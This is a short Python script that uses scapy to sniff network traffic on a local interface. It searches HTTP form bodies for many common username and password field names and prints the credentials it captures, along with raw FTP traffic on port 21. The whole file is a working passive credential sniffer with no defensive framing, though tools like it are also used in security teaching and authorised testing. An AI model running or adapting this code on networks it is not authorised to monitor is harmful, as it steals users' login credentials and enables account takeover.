from scapy.all import *
from urllib import parse


iface = "en0"
conf.verb=0

def get_login_pass(body):

    user = None
    passwd = None

    userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return (user, passwd)

def pkt_parser(pkt):
    if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
        pass

    # TCP
    if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
        pkt[TCP].payload
        mail_packet = str(pkt[TCP].payload)

        body = str(pkt[TCP].payload)
        user_passwd = get_login_pass(body)
        if user_passwd != None:
            print(parse.unquote(user_passwd[0]).encode("utf8"))
            print(parse.unquote( user_passwd[1]).encode("utf8"))

        if pkt[TCP].dport == 21 or pkt[TCP].sport ==21:
            data = pkt[Raw].load
            print(str(data))


    else:
        pass


try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)

